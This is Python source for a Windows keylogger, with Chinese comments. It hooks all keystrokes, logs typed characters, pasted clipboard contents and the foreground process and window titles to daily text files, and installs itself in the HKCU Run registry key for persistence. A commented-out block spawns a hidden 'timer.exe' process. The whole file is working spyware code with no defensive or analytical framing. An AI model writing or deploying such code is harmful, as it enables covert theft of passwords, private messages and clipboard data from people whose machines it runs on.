# -*- coding: utf-8 -*-
import os
import sys
import time
import win32api
import win32clipboard
from ctypes import *
import win32process
import pyHook
import pythoncom
import win32con
import ConfigParser

config = ConfigParser.ConfigParser()


def getproperties(type, name):
    with open('config.cfg', 'r') as cfgfile:
        config.readfp(cfgfile)
        return config.get(type, name)

reload(sys)
sys.setdefaultencoding("utf-8")
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
folder = getproperties('folder', 'folder')

def registerRun():
    path = sys.executable  # 要添加的exe路径
    name = path[path.rindex('\\') + 1:path.rindex('.')]  # 要添加的项值名称
    # 注册表项名
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    # 异常处理
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)
    except:
        print('error')
    print('添加成功！')


def filewriter(str1):
    #x = os.path.dirname(sys.executable) + '\\' + folder + '\\' + time.strftime('%Y-%m-%d',time.localtime(time.time())) + '.txt'
    x = os.path.dirname(os.path.realpath(__file__)) + '\\' + folder + '\\' + time.strftime('%Y-%m-%d', time.localtime(time.time())) + '.txt'
    f = open(x, 'a')
    f.write(str1)
    f.flush()


def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)
    filewriter("\n" + "[ PID:%s-%s-%s]" % (process_id, executable.value, windows_title.value) + "\n")
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if 32 < event.Ascii < 127:
        filewriter(chr(event.Ascii)),
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            filewriter("[PASTE]-%s" % pasted_value + "\n"),
        else:
            filewriter("[%s]" % event.Key),
    return True

def loger_start():
    ''' try:
        file = open('app.pid','r')
        x = file.readline()
        file.close()
        aa = win32process.CreateProcess('timer.exe', '', None, None, 0, win32process.CREATE_NO_WINDOW, None, None,
                                win32process.STARTUPINFO())
        if aa[2] == int(x):
            win32process.TerminateProcess(aa[0], 0)
        else:
            f = open('app.pid','w')
            f.write(str(aa[2]))
            f.close()
    except():
        print("error") '''
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    kl.HookKeyboard()
    pythoncom.PumpMessages()

